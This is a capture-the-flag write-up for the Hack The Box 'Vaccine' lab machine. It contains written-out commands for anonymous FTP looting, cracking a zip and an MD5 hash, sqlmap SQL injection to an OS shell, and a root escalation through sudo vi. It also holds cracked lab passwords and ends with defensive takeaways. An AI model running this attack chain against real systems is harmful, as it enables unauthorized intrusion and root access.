# Vaccine

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Anonymous FTP, zip/MD5 cracking, SQL injection (sqlmap os-shell), creds in source, sudo vi GTFOBins |

## Overview
A full chain where every stage's loot is the next stage's key: anonymous FTP ->
password-protected zip -> cracked MD5 admin hash -> authenticated SQL injection to an
OS shell -> reused DB password in the web source -> an over-permissive `sudo vi` rule
for root.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 21,22,80 <TARGET_IP>
ftp <TARGET_IP>            # anonymous -> backup.zip
```

## Exploitation (foothold)
```bash
zip2john backup.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt   # (john --show if already cracked)
unzip backup.zip          # index.php has a hardcoded MD5 admin hash
hashid '<md5>'; john --format=raw-md5 hash.txt --wordlist=rockyou.txt   # -> qwerty789
# log in as admin, then exploit the authenticated search parameter:
sqlmap -r search.req -p search --batch --os-shell     # RCE on the PostgreSQL backend
```
Upgraded the os-shell to a reverse shell, then read the reused DB/sudo password from
`/var/www/html/dashboard.php` (`pg_connect(... password=P@s5w0rd! ...)`).

## Privilege Escalation
```bash
sudo -l                                   # (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
export TERM=xterm
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# inside vi (normal mode): type  :!/bin/bash   -> root shell (GTFOBins)
```

## Key Takeaway
Never store backups/source with cleartext creds on anonymous FTP; parameterise queries
to kill the SQLi; run the DB/app as a low-priv user; and never grant an interactive
editor via sudo, it is a root shell. Use `sudoedit` or a specific non-interactive tool.

## What tripped me up
The privesc stalled on a broken TTY over a raw reverse shell: vi rendered garbage and
ESC misbehaved. I learned the proper stabilisation sequence (`python3 -c 'import
pty;pty.spawn("/bin/bash")'`, `export TERM=xterm`, and if needed `stty raw -echo; fg`
from a bash listener). The breakthrough: a messy display is not a broken editor. The
file had loaded fine (the status line confirmed it); I just needed to type the colon
command. sudo also matches the exact command string, so a `-c` argument was rejected and
the escape had to be done interactively.
